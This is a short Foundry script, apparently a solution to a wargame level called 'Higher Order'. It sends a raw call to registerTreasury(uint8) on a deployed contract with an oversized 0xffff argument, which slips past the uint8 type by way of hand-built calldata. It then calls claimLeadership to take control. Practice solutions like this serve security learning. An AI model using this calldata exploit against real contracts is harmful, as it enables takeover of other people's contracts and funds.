// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

contract SwitchScript is Script {
    address constant DEPLOYED_CONTRACT_ADDRESS = 0x2a4A818090cD3f723F9991091bE324a5B16489c8;

    event Log(uint8);
    event LogBytes(bytes);
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        HigherOrder target = HigherOrder(DEPLOYED_CONTRACT_ADDRESS);

        uint16 arg;
        bytes4 funcSelector = bytes4(keccak256("registerTreasury(uint8)"));
        
        // target.registerTreasury(arg);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xffff)
            arg := mload(ptr)
            mstore(0x40, add(ptr, 0x20))
        }
        // emit LogBytes(abi.encodeWithSelector(bytes4(keccak256("registerTreasury(uint8)")), arg));
        // emit LogBytes(abi.encodeWithSelector(funcSelector, arg));
        address(target).call(abi.encodeWithSelector(funcSelector, arg));

        target.claimLeadership();

        vm.stopBroadcast();
    }
}